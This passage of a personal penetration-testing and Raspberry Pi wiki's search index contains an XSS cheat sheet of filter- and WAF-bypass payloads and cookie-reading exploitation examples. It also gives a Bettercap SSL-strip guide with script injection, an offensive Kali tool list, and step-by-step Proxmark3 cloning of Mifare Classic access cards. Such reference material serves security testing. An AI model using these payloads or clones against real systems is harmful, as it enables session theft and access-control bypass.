\"http://google:ha.ckers.org\" > XSS </ a >", "title": "Google \"feeling lucky\" part 3"}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#removing-cnames", "text": "When combined with the above URL, removing www. will save an additional 4 bytes for a total byte savings of 9 for servers that have this set up properly): < a href = \"http://google.com/\" > XSS </ a > Extra dot for absolute DNS: < a href = \"http://www.google.com./\" > XSS </ a >", "title": "Removing CNAMEs"}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#javascript-link-location", "text": "< a href = \"javascript:document.location='http://www.google.com/'\" > XSS </ a >", "title": "JavaScript Link Location"}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#content-replace-as-attack-vector", "text": "Assuming http://www.google.com/ is programmatically replaced with nothing). I actually used a similar attack vector against a several separate real world XSS filters by using the conversion filter itself (here is an example) to help create the attack vector (IE: java&\\#x09;script: was converted into java script: , which renders in IE, Netscape 8.1+ in secure site mode and Opera): < a href = \"http://www.google.com/ogle.com/\" > XSS </ a >", "title": "Content Replace as Attack Vector"}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#assisting-xss-with-http-parameter-pollution", "text": "Assume a content sharing flow on a web site is implemented as below. There is a \"Content\" page which includes some content provided by users and this page also includes a link to \"Share\" page which enables a user choose their favorite social sharing platform to share it on. Developers HTML encoded the \"title\" parameter in the \"Content\" page to prevent against XSS but for some reasons they didn't URL encoded this parameter to prevent from HTTP Parameter Pollution. Finally they decide that since content_type's value is a constant and will always be integer, they didn't encode or validate the content_type in the \"Share\" page.", "title": "Assisting XSS with HTTP Parameter Pollution"}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#content-page-source-code", "text": "`a href=\"/Share?content_type=1 & title= < %=Encode.forHtmlAttribute(untrusted content title)%>\">Share </ a >", "title": "Content Page Source Code"}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#share-page-source-code", "text": "< script > var contentType = <%= Request . getParameter ( \"content_type\" ) %> ; var title = \"<%=Encode.forJavaScript(request.getParameter(\" title \"))%>\" ; ... //some user agreement and sending to server logic might be here ... </ script >", "title": "Share Page Source Code"}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#content-page-output", "text": "In this case if attacker set untrusted content title as \u201cThis is a regular title&content_type=1;alert(1)\u201d the link in \"Content\" page would be this: < a href = \"/share?content_type=1&title=This is a regular title&amp;content_type=1;alert(1)\" > Share </ a >", "title": "Content Page Output"}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#share-page-output", "text": "And in share page output could be this: < script > var contentType = 1 ; alert ( 1 ); var title = \"This is a regular title\" ; \u2026 //some user agreement and sending to server logic might be here \u2026 </ script > As a result, in this example the main flaw is trusting the content_type in the \"Share\" page without proper encoding or validation. HTTP Parameter Pollution could increase impact of the XSS flaw by promoting it from a reflected XSS to a stored XSS.", "title": "Share Page Output"}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#character-escape-sequences", "text": "All the possible combinations of the character \"\\<\" in HTML and JavaScript. Most of these won't render out of the box, but many of them can get rendered in certain circumstances as seen above. < %3C &lt &lt; &LT &LT; &#60; &#060; &#0060; &#00060; &#000060; &#0000060; &#60; &#060; &#0060; &#00060; &#000060; &#0000060; &#x3c; &#x03c; &#x003c; &#x0003c; &#x00003c; &#x000003c; &#x3c; &#x03c; &#x003c; &#x0003c; &#x00003c; &#x000003c; &#X3c; &#X03c; &#X003c; &#X0003c; &#X00003c; &#X000003c; &#X3c; &#X03c; &#X003c; &#X0003c; &#X00003c; &#X000003c; &#x3C; &#x03C; &#x003C; &#x0003C; &#x00003C; &#x000003C; &#x3C; &#x03C; &#x003C; &#x0003C; &#x00003C; &#x000003C; &#X3C; &#X03C; &#X003C; &#X0003C; &#X00003C; &#X000003C; &#X3C; &#X03C; &#X003C; &#X0003C; &#X00003C; &#X000003C; \\x3c \\x3C \\u003c \\u003C", "title": "Character Escape Sequences"}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#methods-to-bypass-waf-cross-site-scripting", "text": "", "title": "Methods to Bypass WAF \u2013 Cross-Site Scripting"}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#stored-xss", "text": "If an attacker managed to push XSS through the filter, WAF wouldn\u2019t be able to prevent the attack conduction.", "title": "Stored XSS"}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#reflected-xss-in-javascript", "text": "Example: <script> ... setTimeout(\\\\\"writetitle()\\\\\",$\\_GET\\[xss\\]) ... </script> Exploitation: /?xss=500); alert(document.cookie);//", "title": "Reflected XSS in Javascript"}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#dom-based-xss", "text": "Example: <script> ... eval($\\_GET\\[xss\\]); ... </script> Exploitation: /?xss=document.cookie", "title": "DOM-based XSS"}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#xss-via-request-redirection", "text": "Vulnerable code: ... header('Location: '.$_GET['param']); ... As well as: .. header('Refresh: 0; URL='.$_GET['param']); ... This request will not pass through the WAF: /?param=<javascript:alert(document.cookie>) This request will pass through the WAF and an XSS attack will be conducted in certain browsers. /?param=<data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=", "title": "XSS via request Redirection"}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#waf-bypass-strings-for-xss", "text": "<Img src = x onerror = \"javascript: window.onerror = alert; throw XSS\"> <Video> <source onerror = \"javascript: alert (XSS)\"> <Input value = \"XSS\" type = text> <applet code=\"javascript:confirm(document.cookie);\"> <isindex x=\"javascript:\" onmouseover=\"alert(XSS)\"> \"></SCRIPT>\u201d>\u2019><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT> \"><img src=\"x:x\" onerror=\"alert(XSS)\"> \"><iframe src=\"javascript:alert(XSS)\"> <object data=\"javascript:alert(XSS)\"> <isindex type=image src=1 onerror=alert(XSS)> <img src=x:alert(alt) onerror=eval(src) alt=0> <img src=\"x:gif\" onerror=\"window['al\\u0065rt'](0)\"></img> <iframe/src=\"data:text/html,<svg onload=alert(1)>\"> <meta content=\"&NewLine; 1 &NewLine;; JAVASCRIPT&colon; alert(1)\" http-equiv=\"refresh\"/> <svg><script xlink:href=data&colon;,window.open('https://www.google.com/')></script <meta http-equiv=\"refresh\" content=\"0;url=javascript:confirm(1)\"> <iframe src=javascript&colon;alert&lpar;document&period;location&rpar;> <form><a href=\"javascript:\\u0061lert(1)\">X </script><img/*%00/src=\"worksinchrome&colon;prompt(1)\"/%00*/onerror='eval(src)'> <style>//*{x:expression(alert(/xss/))}//<style></style> On Mouse Over\u200b <img src=\"/\" =_=\" title=\"onerror='prompt(1)'\"> <a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script:&#97lert(1)>ClickMe <script x> alert(1) </script 1=2 <form><button formaction=javascript&colon;alert(1)>CLICKME <input/onmouseover=\"javaSCRIPT&colon;confirm&lpar;1&rpar;\" <iframe src=\"data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E\"></iframe> <OBJECT CLASSID=\"clsid:333C7BC4-460F-11D0-BC04-0080C7055A83\"><PARAM NAME=\"DataURL\" VALUE=\"javascript:alert(1)\"></OBJECT>", "title": "WAF ByPass Strings for XSS"}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#filter-bypass-alert-obfuscation", "text": "(alert)(1) a=alert,a(1) [1].find(alert) top[\u201cal\u201d+\u201dert\u201d](1) top[/al/.source+/ert/.source](1) al\\u0065rt(1) top[\u2018al\\145rt\u2019](1) top[\u2018al\\x65rt\u2019](1) top[8680439..toString(30)](1) alert?.() ` ${alert``} ` (The payload should include leading and trailing backticks.) (alert()) source: OWASP / www-community", "title": "Filter Bypass Alert Obfuscation"}, {"location": "penetration-testing/kali-linux/bettercap1.6.2/", "text": "Bettercap 1.6.2 Installation \u00b6 BetterCAP is a powerful, flexible, and portable tool created to perform various types of MITM attacks against a network Bettercap 1.6.2 is legacy tool, but it performs ssl strip much better then Bettercap 2.x Install Ruby Gem apt install -y ruby-full libpcap-dev gem update --system gem install bettercap Bettercap 1.6.2 installs the executable to /usr/local/bin/bettercap Bettercap 2.x installs the executable to /usr/bin/bettercap Both Bettercap 1.6.2 and 2.x shares the same executable name. In order to privet any collisions we will rename the Bettercap 1.6.2 executable to bettercap1.6.2 . mv /usr/local/bin/bettercap /usr/local/bin/bettercap1.6.2 From this point you can run bettercap1.6.2 for Bettercap 1.6.2 and bettercap for Bettercap 2.x Bettercap 1.6.2 SSL Strip Examples \u00b6 Basic SSL Strip Example bettercap1.6.2 -X -T 192 .168.1.104 --proxy SSL Strip With XSS Example bettercap1.6.2 -X -T 192 .168.3.104 --proxy --proxy-module injectjs --js-data \"<script>alert('SSL STRIP, Script Injection')</script>\" Dbug \u00b6 To find that Bettercap installation from ruby gems: gem environment the path should be under GEM PATHP for example: /var/lib/gems/2.7.0/gems/bettercap-1.6.2", "title": "Bettercap1.6.2"}, {"location": "penetration-testing/kali-linux/bettercap1.6.2/#bettercap-162-installation", "text": "BetterCAP is a powerful, flexible, and portable tool created to perform various types of MITM attacks against a network Bettercap 1.6.2 is legacy tool, but it performs ssl strip much better then Bettercap 2.x Install Ruby Gem apt install -y ruby-full libpcap-dev gem update --system gem install bettercap Bettercap 1.6.2 installs the executable to /usr/local/bin/bettercap Bettercap 2.x installs the executable to /usr/bin/bettercap Both Bettercap 1.6.2 and 2.x shares the same executable name. In order to privet any collisions we will rename the Bettercap 1.6.2 executable to bettercap1.6.2 . mv /usr/local/bin/bettercap /usr/local/bin/bettercap1.6.2 From this point you can run bettercap1.6.2 for Bettercap 1.6.2 and bettercap for Bettercap 2.x", "title": "Bettercap 1.6.2 Installation"}, {"location": "penetration-testing/kali-linux/bettercap1.6.2/#bettercap-162-ssl-strip-examples", "text": "Basic SSL Strip Example bettercap1.6.2 -X -T 192 .168.1.104 --proxy SSL Strip With XSS Example bettercap1.6.2 -X -T 192 .168.3.104 --proxy --proxy-module injectjs --js-data \"<script>alert('SSL STRIP, Script Injection')</script>\"", "title": "Bettercap 1.6.2 SSL Strip Examples"}, {"location": "penetration-testing/kali-linux/bettercap1.6.2/#dbug", "text": "To find that Bettercap installation from ruby gems: gem environment the path should be under GEM PATHP for example: /var/lib/gems/2.7.0/gems/bettercap-1.6.2", "title": "Dbug"}, {"location": "penetration-testing/kali-linux/kali-linux/", "text": "Kali Linux \u00b6 Minimal Headless Kali Linux installation - Works for Cloud VM Installation (NO GUI) \u00b6 This is a simple guide to install Minimal Headless Kali Linux by converting a Debian Linux to Kali Linux distro without any unnecessary tools. Basically you install the tools you need. Platforms Minimum Monthly Price DigitalOcean.com 5$ (This link provides 100$ for 60 days) First of all we will need a clean Debian Linux local or at any cloud provider with ssh access Let's convert! We will install two packages which allow as to replace Debian's repo to kali repo apt update apt install -y gnupg gnupg2 wget wget -q -O - https://archive.kali.org/archive-key.asc | apt-key add rm -rf /etc/apt/sources.list echo \"deb http://http.kali.org/kali kali-rolling main contrib non-free\" >> /etc/apt/sources.list Now after we replaced the repo to Kali we need to install the Basic Kali Linux core apt -y update apt-cache search kali-linux apt install -y kali-linux-core apt-get -y update apt-get -y dist-upgrade apt-get -y autoremove Reboot the server to complete the conversion process. In order to test that you are using Kali Linux uname -a After we got our new Minimal Kali ready we need to cleanup some Debian's leftovers to finnish systemctl stop rpcbind.socket rpcbind smbd systemctl disable rpcbind.socket rpcbind smbd That's It, now we can install any package we need from Kali repo. Here are some of my personal packages I use daily apt update && apt install -y \\ curl wget git dnsutils whois net-tools htop locate telnet traceroute \\ dirb wfuzz dirbuster enum4linux gobuster nbtscan nikto nmap \\ onesixtyone oscanner smbclient fern-wifi-cracker crowbar smbmap \\ smtp-user-enum sslscan tnscmd10g whatweb snmpcheck wkhtmltopdf \\ sipvicious seclists wordlists hydra bully netcat-openbsd netcat-traditional \\ adb fastboot realtek-rtl88xxau-dkms docker docker-compose crunch \\ wifite apktool apksigner zipalign default-jre default-jdk man-db \\ screenfetch xsltproc binwalk python3-pip zlib1g-dev python2.7-dev \\ subfinder chrony hcxtools libssl-dev hcxdumptool hashcat hash-identifier \\ libpcap-dev npm sqlmap wpscan exploitdb minicom screen hashid nfs-common Fix SSH Broken Pipe in Kali \u00b6 nano ~/.ssh/config add this: Host * IPQoS = throughput", "title": "Kali Linux"}, {"location": "penetration-testing/kali-linux/kali-linux/#kali-linux", "text": "", "title": "Kali Linux"}, {"location": "penetration-testing/kali-linux/kali-linux/#minimal-headless-kali-linux-installation-works-for-cloud-vm-installation-no-gui", "text": "This is a simple guide to install Minimal Headless Kali Linux by converting a Debian Linux to Kali Linux distro without any unnecessary tools. Basically you install the tools you need. Platforms Minimum Monthly Price DigitalOcean.com 5$ (This link provides 100$ for 60 days) First of all we will need a clean Debian Linux local or at any cloud provider with ssh access Let's convert! We will install two packages which allow as to replace Debian's repo to kali repo apt update apt install -y gnupg gnupg2 wget wget -q -O - https://archive.kali.org/archive-key.asc | apt-key add rm -rf /etc/apt/sources.list echo \"deb http://http.kali.org/kali kali-rolling main contrib non-free\" >> /etc/apt/sources.list Now after we replaced the repo to Kali we need to install the Basic Kali Linux core apt -y update apt-cache search kali-linux apt install -y kali-linux-core apt-get -y update apt-get -y dist-upgrade apt-get -y autoremove Reboot the server to complete the conversion process. In order to test that you are using Kali Linux uname -a After we got our new Minimal Kali ready we need to cleanup some Debian's leftovers to finnish systemctl stop rpcbind.socket rpcbind smbd systemctl disable rpcbind.socket rpcbind smbd That's It, now we can install any package we need from Kali repo. Here are some of my personal packages I use daily apt update && apt install -y \\ curl wget git dnsutils whois net-tools htop locate telnet traceroute \\ dirb wfuzz dirbuster enum4linux gobuster nbtscan nikto nmap \\ onesixtyone oscanner smbclient fern-wifi-cracker crowbar smbmap \\ smtp-user-enum sslscan tnscmd10g whatweb snmpcheck wkhtmltopdf \\ sipvicious seclists wordlists hydra bully netcat-openbsd netcat-traditional \\ adb fastboot realtek-rtl88xxau-dkms docker docker-compose crunch \\ wifite apktool apksigner zipalign default-jre default-jdk man-db \\ screenfetch xsltproc binwalk python3-pip zlib1g-dev python2.7-dev \\ subfinder chrony hcxtools libssl-dev hcxdumptool hashcat hash-identifier \\ libpcap-dev npm sqlmap wpscan exploitdb minicom screen hashid nfs-common", "title": "Minimal Headless Kali Linux installation - Works for Cloud VM Installation (NO GUI)"}, {"location": "penetration-testing/kali-linux/kali-linux/#fix-ssh-broken-pipe-in-kali", "text": "nano ~/.ssh/config add this: Host * IPQoS = throughput", "title": "Fix SSH Broken Pipe in Kali"}, {"location": "penetration-testing/kali-linux/links/", "text": "Links \u00b6 Usefully Tools for Pentesters \u00b6 Links Description Eicar Files Files With Virus Signature Credit Card Generator PayPal Credit Card Generator - Login Required ipleak.net Displays Information About Your IP mxtoolbox Network Tools Related to DNS jwt.io Allows You to Decode, Verify and Generate Json Web Tokens DNS Dumpster Domain Research Tool That Can Discover Hosts Related to a Domain SSL-Lab Deep Analysis of The Configuration of any SSL Web Server GraphQLmap Engine to interact with a graphqlr endpoint for penetration-testing purposes.", "title": "Links"}, {"location": "penetration-testing/kali-linux/links/#links", "text": "", "title": "Links"}, {"location": "penetration-testing/kali-linux/links/#usefully-tools-for-pentesters", "text": "Links Description Eicar Files Files With Virus Signature Credit Card Generator PayPal Credit Card Generator - Login Required ipleak.net Displays Information About Your IP mxtoolbox Network Tools Related to DNS jwt.io Allows You to Decode, Verify and Generate Json Web Tokens DNS Dumpster Domain Research Tool That Can Discover Hosts Related to a Domain SSL-Lab Deep Analysis of The Configuration of any SSL Web Server GraphQLmap Engine to interact with a graphqlr endpoint for penetration-testing purposes.", "title": "Usefully Tools for Pentesters"}, {"location": "penetration-testing/kali-linux/metasploit/", "text": "Metasploit Framework \u00b6 Installation \u00b6 apt install -y metasploit-framework postgresql systemctl enable postgresql systemctl start postgresql msfdb init Start: msfconsole", "title": "Metasploit Framework"}, {"location": "penetration-testing/kali-linux/metasploit/#metasploit-framework", "text": "", "title": "Metasploit Framework"}, {"location": "penetration-testing/kali-linux/metasploit/#installation", "text": "apt install -y metasploit-framework postgresql systemctl enable postgresql systemctl start postgresql msfdb init Start: msfconsole", "title": "Installation"}, {"location": "penetration-testing/kali-linux/wifite/", "text": "Wifite \u00b6 Wifite is an automated wireless attack tool. Wifite2 Github page In order to perform wifi attacks you need a wifi card with Monitor Mode and Frame Injection like Realtek rtl8812au chipset. Suggested Wifi Dongles Alfa AWUS036ACH Alfa AC1900 1200Mbps USB WiFi Adapter Alfa AWUS036ACS Install in kali \u00b6 apt install wifite Install Pyrit for Wifite \u00b6 Pyrit Github page Install dependencies apt install python zlib openssl git The Install cd ~ git clone https://github.com/JPaulMora/Pyrit.git ; pip install psycopg2 scapy ; cd Pyrit python setup.py clean ; python setup.py build ; python setup.py install ; rm -rf ~/Pyrit", "title": "Wifite"}, {"location": "penetration-testing/kali-linux/wifite/#wifite", "text": "Wifite is an automated wireless attack tool. Wifite2 Github page In order to perform wifi attacks you need a wifi card with Monitor Mode and Frame Injection like Realtek rtl8812au chipset. Suggested Wifi Dongles Alfa AWUS036ACH Alfa AC1900 1200Mbps USB WiFi Adapter Alfa AWUS036ACS", "title": "Wifite"}, {"location": "penetration-testing/kali-linux/wifite/#install-in-kali", "text": "apt install wifite", "title": "Install in kali"}, {"location": "penetration-testing/kali-linux/wifite/#install-pyrit-for-wifite", "text": "Pyrit Github page Install dependencies apt install python zlib openssl git The Install cd ~ git clone https://github.com/JPaulMora/Pyrit.git ; pip install psycopg2 scapy ; cd Pyrit python setup.py clean ; python setup.py build ; python setup.py install ; rm -rf ~/Pyrit", "title": "Install Pyrit for Wifite"}, {"location": "penetration-testing/proxmark/Mifare1k/", "text": "Mifare Classic 1K ISO14443A \u00b6 How to clone Mifare Classic 1K ISO14443A NFC Tag \u00b6 proxmark3> hf search Which results in a response along the lines of: #db# DownloadFPGA(len: 42096) UID : de 0f 3d cd ATQA : 00 04 SAK : 08 [ 2 ] TYPE : NXP MIFARE CLASSIC 1k | Plus 2k SL1 proprietary non iso14443-4 card found, RATS not supported No chinese magic backdoor command detected Prng detection: HARDENED ( hardnested ) Valid ISO14443A Tag Found - Quiting Search As we can see the output ISO14443A Tag Found it's Mifare 1k card. This also shows us the UID de0f3dcd of the card, which we\u2019ll need later. From there we can find keys in use by checking against a list of default keys (hopefully one of these has been used) proxmark3> hf mf chk * ? This should show us the key we require looking something like No key specified, trying default keys chk default key [ 0 ] ffffffffffff chk default key [ 1 ] 000000000000 chk default key [ 2 ] a0a1a2a3a4a5 chk default key [ 3 ] b0b1b2b3b4b5 chk default key [ 4 ] aabbccddeeff chk default key [ 5 ] 4d3a99c351dd chk default key [ 6 ] 1a982c7e459a chk default key [ 7 ] d3f7d3f7d3f7 chk default key [ 8 ] 714c5c886e97 chk default key [ 9 ] 587ee5f9350f chk default key [ 10 ] a0478cc39091 chk default key [ 11 ] 533cb6c723f6 chk default key [ 12 ] 8fd0a4f256e9 --sector: 0 , block: 3 , key type:A, key count:13 Found valid key: [ ffffffffffff ] ...omitted for brevity... --sector:15, block: 63 , key type:B, key count:13 Found valid key: [ ffffffffffff ] This shows a key of ffffffffffff , which we can plug into the next command, which dumps keys to file dumpkeys.bin . proxmark3> hf mf nested 1 0 A ffffffffffff d Now to dump the contents of the card. This dumps data from the card into dumpdata.bin proxmark3> hf mf dump At this point we\u2019ve got everything we need from the card, we can take it off the reader. To copy that data onto a new card, place the (Chinese backdoor) card on the Proxmark . This restores the dumped data onto the new card. Now we just need to give the card the UID we got from the original hf search command proxmark3> hf mf restore 1 Copy the UID of the original card de0f3dcd proxmark3> hf mf csetuid de0f3dcd We\u2019re done.", "title": "Mifare Classic 1K ISO14443A"}, {"location": "penetration-testing/proxmark/Mifare1k/#mifare-classic-1k-iso14443a", "text": "", "title": "Mifare Classic 1K ISO14443A"}, {"location": "penetration-testing/proxmark/Mifare1k/#how-to-clone-mifare-classic-1k-iso14443a-nfc-tag", "text": "proxmark3> hf search Which results in a response along the lines of: #db# DownloadFPGA(len: 42096) UID : de 0f 3d cd ATQA : 00 04 SAK : 08 [ 2 ] TYPE : NXP MIFARE CLASSIC 1k | Plus 2k SL1 proprietary non iso14443-4 card found, RATS not supported No chinese magic backdoor command detected Prng detection: HARDENED ( hardnested ) Valid ISO14443A Tag Found - Quiting Search As we can see the output ISO14443A Tag Found it's Mifare 1k card. This also shows us the UID de0f3dcd of the card, which we\u2019ll need later. From there we can find keys in use by checking against a list of default keys (hopefully one of these has been used) proxmark3> hf mf chk * ? This should show us the key we require looking something like No key specified, trying default keys chk default key [ 0 ] ffffffffffff chk default key [ 1 ] 000000000000 chk default key [ 2 ] a0a1a2a3a4a5 chk default key [ 3 ] b0b1b2b3b4b5 chk default key [ 4 ] aabbccddeeff chk default key [ 5 ] 4d3a99c351dd chk default key [ 6 ] 1a982c7e459a chk default key [ 7 ] d3f7d3f7d3f7 chk default key [ 8 ] 714c5c886e97 chk default key [ 9 ] 587ee5f9350f chk default key [ 10 ] a0478cc39091 chk default key [ 11 ] 533cb6c723f6 chk default key [ 12 ] 8fd0a4f256e9 --sector: 0 , block: 3 , key type:A, key count:13 Found valid key: [ ffffffffffff ] ...omitted for brevity... --sector:15, block: 63 , key type:B, key count:13 Found valid key: [ ffffffffffff ] This shows a key of ffffffffffff , which we can plug into the next command, which dumps keys to file dumpkeys.bin . proxmark3> hf mf nested 1 0 A ffffffffffff d Now to dump the contents of the card. This dumps data from the card into dumpdata.bin proxmark3> hf mf dump At this point we\u2019ve got everything we need from the card, we can take it off the reader. To copy that data onto a new card, place the (Chinese backdoor) card on the Proxmark . This restores the dumped data onto the new card. Now we just need to give the card the UID we got from the original hf search command proxmark3> hf mf restore 1 Copy the UID of the original card de0f3dcd proxmark3> hf mf csetuid de0f3dcd We\u2019re done.", "title": "How to clone Mifare Classic 1K ISO14443A NFC Tag"}, {"location": "penetration-testing/proxmark/about-proxmark/", "text": "About Promark3 \u00b6 The Proxmark is an RFID swiss-army tool, allowing for both high and low level interactions with the vast majority of RFID tags and systems world-wide. There are few Promark Devices, and you can find them at the offical website. I personally use the device at the picture above, you can get one at Proxmark3 - Amazon Proxmark3 - Aliexpress it's cheap and suites my needs The RFID tags i use are duel band tags 13.56Mhz and 125KHz RFID tags - Amazon RFID tags - Aliexpress Useful Links: Official Proxmark Website Official Proxmark3 Github Repo Andprox - Android client", "title": "About Promark3"}, {"location": "penetration-testing/proxmark/about-proxmark/#about-promark3", "text": "The Proxmark is an RFID swiss-army tool, allowing for both high and low level interactions with the vast majority of RFID tags and systems world-wide. There are few Promark Devices, and you can find them at the offical website. I personally use the device at the picture above, you can get one at Proxmark3 - Amazon Proxmark3 - Aliexpress it's cheap and suites my needs The RFID tags i use are duel band tags 13.56Mhz and 125KHz RFID tags - Amazon RFID tags - Aliexpress Useful Links: Official Proxmark Website Official Proxmark3 Github Repo Andprox - Android client", "title": "About Promark3"}, {"location": "penetration-testing/proxmark/cheatsheet/", "text": "Proxmark3 CheatSheet \u00b6 Basics \u00b6 Command Description hf search Identify High Frequency cards lf search Identify Low Frequency cards hw tune Measure antenna characteristics, LF/HF voltage should be around 20-45+ V hw version Check version hw status Check overall status", "title": "Proxmark3 CheatSheet"}, {"location": "penetration-testing/proxmark/cheatsheet/#proxmark3-cheatsheet", "text": "", "title": "Proxmark3 CheatSheet"}, {"location": "penetration-testing/proxmark/cheatsheet/#basics", "text": "Command Description hf search Identify High Frequency cards lf search Identify Low Frequency cards hw tune Measure antenna characteristics, LF/HF voltage should be around 20-45+ V hw version Check version hw status Check overall status", "title": "Basics"}, {"location": "penetration-testing/utilities/clickjacking/", "text": "Clickjacking Test Page \u00b6 Full Screen Version", "title": "Clickjacking Test Page"}, {"location": "penetration-testing/utilities/clickjacking/#clickjacking-test-page", "text": "Full Screen Version", "title": "Clickjacking Test Page"}, {"location": "penetration-testing/utilities/idd-generator/", "text": "IID Generator & Validator \u00b6 Description \u00b6 This is a simple Java Script tool to validate or generate a random Israel's ID number. Credit & Sources \u00b6 The code was built by Georgy Bunin and cloned from his repository . It was slightly modified to fit this website.", "title": "IID Generator & Validator"}, {"location": "penetration-testing/utilities/idd-generator/#iid-generator-validator", "text": "", "title": "IID Generator &amp; Validator"}, {"location": "penetration-testing/utilities/idd-generator/#description", "text": "This is a simple Java Script tool to validate or generate a random Israel's ID number.", "title": "Description"}, {"location": "penetration-testing/utilities/idd-generator/#credit-sources", "text": "The code was built by Georgy Bunin and cloned from his repository . It was slightly modified to fit this website.", "title": "Credit &amp; Sources"}, {"location": "raspberry-pi/docker-raspberrypi/", "tags": ["docker", "raspberry-pi", "docker-compose"], "text": "Docker and Docker-compose on Raspberry Pi \u00b6 How to install docker on Raspberry Pi \u00b6 sudo apt install -y docker.io Runing Docker as root \u00b6 sudo usermod -aG docker pi Manage Docker as a non-root user \u00b6 The Docker daemon binds to a Unix socket instead of a TCP port. By default that Unix socket is owned by the user root and other users can only access it using sudo. The Docker daemon always runs as the root user. If you don\u2019t want to preface the docker command with sudo, create a Unix group called docker and add users to it. When the Docker daemon starts, it creates a Unix socket accessible by members of the docker group. Warning The docker group grants privileges equivalent to the root user. sudo groupadd docker sudo usermod -aG docker $USER newgrp docker How to install docker-compose on Raspberry Pi \u00b6 sudo apt install docker-compose", "title": "Docker on Raspberry Pi"}, {"location": "raspberry-pi/docker-raspberrypi/#docker-and-docker-compose-on-raspberry-pi", "text": "", "title": "Docker and Docker-compose on Raspberry Pi"}, {"location": "raspberry-pi/docker-raspberrypi/#how-to-install-docker-on-raspberry-pi", "text": "sudo apt install -y docker.io", "title": "How to install docker on Raspberry Pi"}, {"location": "raspberry-pi/docker-raspberrypi/#runing-docker-as-root", "text": "sudo usermod -aG docker pi", "title": "Runing Docker as root"}, {"location": "raspberry-pi/docker-raspberrypi/#manage-docker-as-a-non-root-user", "text": "The Docker daemon binds to a Unix socket instead of a TCP port. By default that Unix socket is owned by the user root and other users can only access it using sudo. The Docker daemon always runs as the root user. If you don\u2019t want to preface the docker command with sudo, create a Unix group called docker and add users to it. When the Docker daemon starts, it creates a Unix socket accessible by members of the docker group. Warning The docker group grants privileges equivalent to the root user. sudo groupadd docker sudo usermod -aG docker $USER newgrp docker", "title": "Manage Docker as a non-root user"}, {"location": "raspberry-pi/docker-raspberrypi/#how-to-install-docker-compose-on-raspberry-pi", "text": "sudo apt install docker-compose", "title": "How to install docker-compose on Raspberry Pi"}, {"location": "raspberry-pi/external-power-button/", "tags": ["raspberry-pi"], "text": "External Power Button For Raspberry Pi \u00b6 Python script to control Raspberry Pi with external power button - Wake/Power Off/Restart(Double Press) Official Github Repo Raspberry Pi Power Button - Wake/Power Off/Restart(Double Press) \u00b6 Information \u00b6 When Raspberry Pi is powered off, shortening GPIO3 (Pin 5) to ground will wake the Raspberry Pi. This script uses pin GPIO3(5), Ground(6) with momentary button. Requirements \u00b6 python3-gpiozero Can be install via apt sudo apt install python3-gpiozero Install \u00b6 This will install the script as service and it will run at boot curl https://raw.githubusercontent.com/fire1ce/raspberry-pi-power-button/main/install.sh | bash Uninstall \u00b6 curl https://raw.githubusercontent.com/fire1ce/raspberry-pi-power-button/main/uninstall.sh | bash Default Behavior \u00b6 Button Press (Raspberry Pi is ON) Behavior Single Nothing Double Reboot Long press and releases (above 3 seconds) Power off Button Press (Raspberry Pi is OFF) Behavior Single Power On Check if service is running \u00b6 sudo systemctl status power_button.service", "title": "External Power Button"}, {"location": "raspberry-pi/external-power-button/#external-power-button-for-raspberry-pi", "text": "Python script to control Raspberry Pi with external power button - Wake/Power Off/Restart(Double Press) Official Github Repo", "title": "External Power Button For Raspberry Pi"}, {"location": "raspberry-pi/external-power-button/#raspberry-pi-power-button-wakepower-offrestartdouble-press", "text": "", "title": "Raspberry Pi Power Button - Wake/Power Off/Restart(Double Press)"}, {"location": "raspberry-pi/external-power-button/#information", "text": "When Raspberry Pi is powered off, shortening GPIO3 (Pin 5) to ground will wake the Raspberry Pi. This script uses pin GPIO3(5), Ground(6) with momentary button.", "title": "Information"}, {"location": "raspberry-pi/external-power-button/#requirements", "text": "python3-gpiozero Can be install via apt sudo apt install python3-gpiozero", "title": "Requirements"}, {"location": "raspberry-pi/external-power-button/#install", "text": "This will install the script as service and it will run at boot curl https://raw.githubusercontent.com/fire1ce/raspberry-pi-power-button/main/install.sh | bash", "title": "Install"}, {"location": "raspberry-pi/external-power-button/#uninstall", "text": "curl https://raw.githubusercontent.com/fire1ce/raspberry-pi-power-button/main/uninstall.sh | bash", "title": "Uninstall"}, {"location": "raspberry-pi/external-power-button/#default-behavior", "text": "Button Press (Raspberry Pi is ON) Behavior Single Nothing Double Reboot Long press and releases (above 3 seconds) Power off Button Press (Raspberry Pi is OFF) Behavior Single Power On", "title": "Default Behavior"}, {"location": "raspberry-pi/external-power-button/#check-if-service-is-running", "text": "sudo systemctl status power_button.service", "title": "Check if service is running"}, {"location": "raspberry-pi/motion-sensor-display-control/", "tags": ["raspberry-pi", "motion-sensor", "automation"], "text": "Motion Sensor Display Control \u00b6 Python script to control connected display to Raspberry Pi using Motion Sensor (pir). Official Github Repo Information \u00b6 This script uses pin GPIO4(7) to read data from Motion (PIR) Sensor, Any 5v and ground for PIR Sensor Requirements \u00b6 python3-gpiozero Can be install via apt sudo apt install python3-gpiozero Install \u00b6 This will install the script as service and it will run at boot curl https://raw.githubusercontent.com/fire1ce/raspberry-pi-pir-motion-display-control/main/install.sh | bash Uninstall \u00b6 curl https://raw.githubusercontent.com/fire1ce/raspberry-pi-pir-motion-display-control/main/uninstall.sh | bash Default Behavior \u00b6 Condition Behavior Motion while display is off Turns 